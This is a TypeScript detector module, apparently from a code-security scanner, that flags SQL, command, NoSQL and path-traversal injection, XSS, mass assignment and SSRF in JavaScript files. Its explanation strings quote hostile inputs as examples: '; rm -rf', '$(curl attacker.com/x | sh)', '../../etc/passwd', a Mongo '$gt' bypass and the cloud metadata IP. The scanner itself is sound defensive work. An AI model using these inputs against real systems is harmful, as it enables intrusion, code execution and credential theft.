import { readFile } from "node:fs/promises";
import { randomUUID } from "node:crypto";
import type { ConfidenceLevel, Domain, Finding } from "@verglos/shared";
import type { ScannedFile } from "../walker.js";
import { isMetadataKeyLine } from "../context.js";
import type { Detector } from "./types.js";

interface InjectionPattern {
  name: string;
  rule: string;
  domain: Domain;
  pattern: RegExp;
  severity: Finding["severity"];
  description: string;
  why: string;
  fix: string;
}

const INJECTION_PATTERNS: InjectionPattern[] = [
  {
    name: "SQL injection (string concat)",
    rule: "D1-001",
    domain: "D1",
    pattern: /(?:query|execute)\s*\(\s*[`'"].*?\$\{/i,
    severity: "critical",
    description: "SQL query built with string interpolation may allow SQL injection.",
    why: "String-interpolated queries let user input become part of the SQL grammar. That's every SQL-injection tutorial ever, and it still ends companies.",
    fix: "Use parameterized queries or an ORM with prepared statements.",
  },
  {
    name: "SQL injection (concatenation)",
    rule: "D1-002",
    domain: "D1",
    pattern: /(?:query|execute)\s*\(\s*[^)]*\+/i,
    severity: "critical",
    description: "SQL query built with concatenation may allow SQL injection.",
    why: "Concatenating user input into SQL is identical to string interpolation — the driver has no way to know where the query ends and the data begins.",
    fix: "Use parameterized queries or an ORM with prepared statements.",
  },
  {
    name: "Command injection (exec)",
    rule: "D1-003",
    domain: "D1",
    // Only flag when the exec-line contains a clearly user-input-shaped
    // token (req./params./body./query./searchParams/formData/userInput).
    // Bare `${...}` interpolation is not enough — that catches
    // `execSync(\`git log ${sha}\`)` where sha is trusted internal state.
    pattern: /(?:exec|execSync|spawn|spawnSync)\s*\(\s*[^)]*(?:req\.|request\.|params\.|body\.|query\.|searchParams|formData|\buserInput\b)/i,
    severity: "critical",
    description: "Shell command executed with user-controlled input.",
    why: "Shelling out with user input gives an attacker your process's shell. A single `; rm -rf` or `$(curl attacker.com/x | sh)` is often enough.",
    fix: "Avoid shell execution with user input. Use allowlists and sanitize inputs.",
  },
  {
    name: "XSS (dangerouslySetInnerHTML)",
    rule: "D1-004",
    domain: "D1",
    pattern: /dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html:\s*[^}]*(?:req\.|params\.|body\.|\$\{)/i,
    severity: "high",
    description: "dangerouslySetInnerHTML with dynamic content can lead to XSS.",
    why: "React's dangerouslySetInnerHTML bypasses its normal escaping. Any user-controlled string that reaches it can inject scripts into your users' sessions.",
    fix: "Sanitize HTML with DOMPurify before rendering.",
  },
  {
    name: "NoSQL injection",
    rule: "D1-005",
    domain: "D1",
    pattern: /\{\s*\$gt\s*:\s*['"]{2}\s*\}/i,
    severity: "critical",
    description: "NoSQL injection pattern detected ($gt bypass).",
    why: "The `{$gt: \"\"}` shape bypasses Mongo authentication when user JSON is passed straight into a query — every stored user matches.",
    fix: "Validate and sanitize all user input before database queries.",
  },
  {
    name: "Path traversal",
    rule: "D1-006",
    domain: "D1",
    // Same reasoning as D1-003: bare `${...}` catches every
    // `readFile(\`${projectRoot}/config.json\`)` in real code. Require
    // an explicit user-input token to keep precision high.
    pattern: /(?:readFile|readFileSync|createReadStream)\s*\(\s*[^)]*(?:req\.|request\.|params\.|body\.|query\.|searchParams|formData|\buserInput\b)/i,
    severity: "high",
    description: "File read with user-controlled path may allow path traversal.",
    why: "A path like `../../etc/passwd` walks out of the intended directory. If any user input reaches a file read without allowlist checking, arbitrary file disclosure follows.",
    fix: "Validate paths against an allowlist. Use path.resolve and check prefix.",
  },
  {
    name: "Mass assignment",
    rule: "D3-001",
    domain: "D3",
    pattern: /\.create\s*\(\s*req\.body\s*\)|\.update\s*\(\s*req\.body\s*\)/i,
    severity: "high",
    description: "Passing req.body directly to model creation allows mass assignment.",
    why: "Spreading req.body lets a user set fields you never intended to expose — `isAdmin`, `stripe_customer_id`, `email_verified`. Models trained on tutorials write this pattern by default.",
    fix: "Explicitly pick allowed fields instead of spreading req.body.",
  },
  {
    name: "SSRF (user-controlled fetch)",
    rule: "D9-002",
    domain: "D9",
    pattern: /fetch\s*\(\s*(?:req\.|params\.|body\.|\$\{)/i,
    severity: "high",
    description: "Fetching a user-supplied URL may allow SSRF attacks.",
    why: "A server-side fetch on a user URL can hit the cloud metadata endpoint (169.254.169.254) and leak IAM credentials, or reach internal services no external attacker could touch.",
    fix: "Validate URLs against an allowlist. Block internal IP ranges.",
  },
];

const USER_CONTROLLED_HTML =
  /req\.body|req\.params|req\.query|userInput|formData|event\.target\.value|params\.|searchParams|location\.hash|location\.search/i;

function previousContext(lines: string[], index: number, radius: number): string {
  return lines.slice(Math.max(0, index - radius), index + 1).join("\n");
}

function nearbyStaticIconAssignment(lines: string[], index: number): boolean {
  const line = lines[index] ?? "";
  const assignedVariable = line.match(/\.innerHTML\s*=\s*([A-Za-z_$][\w$]*)/)?.[1];
  if (!assignedVariable || !/icon/i.test(assignedVariable)) return false;

  const preceding = lines.slice(Math.max(0, index - 100), index).join("\n");
  const declaration = new RegExp(
    `(?:const|let|var)\\s+${assignedVariable}\\s*=\\s*\`[\\s\\S]*\\$\\{\\s*Icon[A-Za-z0-9_$]*\\s*\\}[\\s\\S]*?\``,
  );
  return declaration.test(preceding);
}

function classifyInnerHtml(lines: string[], index: number): {
  severity: Finding["severity"];
  description: string;
  confidence: ConfidenceLevel;
} {
  const context = previousContext(lines, index, 3);
  const line = lines[index] ?? "";

  if (USER_CONTROLLED_HTML.test(context)) {
    return {
      severity: "high",
      description: "innerHTML is assigned from user-controlled input, which can lead to XSS.",
      confidence: "high",
    };
  }

  if (/`[^`]*\$\{[^}]+\}[^`]*`/.test(line) && !USER_CONTROLLED_HTML.test(line)) {
    return {
      severity: "low",
      description:
        "innerHTML is assigned from a template literal without obvious user-controlled input. Review interpolated values, but this is lower risk when values are imported constants, icons, or static strings.",
      confidence: "high",
    };
  }

  if (nearbyStaticIconAssignment(lines, index)) {
    return {
      severity: "low",
      description:
        "innerHTML is assigned from a local icon template using imported static SVG content. Review if the icon source changes, but this is lower risk than user-controlled HTML.",
      confidence: "high",
    };
  }

  return {
    severity: "medium",
    description:
      "innerHTML is assigned from a variable or expression whose origin is unclear. Verify it cannot contain user-controlled HTML.",
    confidence: "medium",
  };
}

export const injectionDetector: Detector = {
  id: "injection",
  async run(files: ScannedFile[]): Promise<Finding[]> {
    const findings: Finding[] = [];
    const seen = new Set<string>();

    for (const file of files) {
      if (!/\.(js|jsx|ts|tsx|mjs|cjs)$/.test(file.relativePath)) continue;

      let content: string;
      try {
        content = await readFile(file.path, "utf8");
      } catch {
        continue;
      }

      const lines = content.split("\n");

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i] ?? "";
        if (isMetadataKeyLine(line)) continue;

        if (/\.innerHTML\s*=/.test(line)) {
          const key = `${file.relativePath}:${i}:XSS (innerHTML)`;
          if (!seen.has(key)) {
            seen.add(key);
            const classified = classifyInnerHtml(lines, i);

            findings.push({
              id: randomUUID(),
              detector: "injection",
              rule: "D1-007",
              domain: "D1",
              severity: classified.severity,
              title: "XSS (innerHTML)",
              description: classified.description,
              why: "innerHTML parses its input as HTML — scripts, event handlers, iframes. If any user-controlled string reaches it unsanitized, XSS follows.",
              file: file.relativePath,
              line: i + 1,
              snippet: line.trim().slice(0, 120),
              fix: "Use textContent for plain text, or sanitize trusted HTML with DOMPurify.",
              confidence: classified.confidence,
              category: "Input Validation & Injection",
            });
          }
        }

        for (const pattern of INJECTION_PATTERNS) {
          if (pattern.pattern.test(line)) {
            const key = `${file.relativePath}:${i}:${pattern.name}`;
            if (seen.has(key)) continue;
            seen.add(key);

            findings.push({
              id: randomUUID(),
              detector: "injection",
              rule: pattern.rule,
              domain: pattern.domain,
              severity: pattern.severity,
              title: pattern.name,
              description: pattern.description,
              why: pattern.why,
              file: file.relativePath,
              line: i + 1,
              snippet: line.trim().slice(0, 120),
              fix: pattern.fix,
              confidence: "high",
              category: "Input Validation & Injection",
            });
          }
        }
      }
    }

    return findings;
  },
};
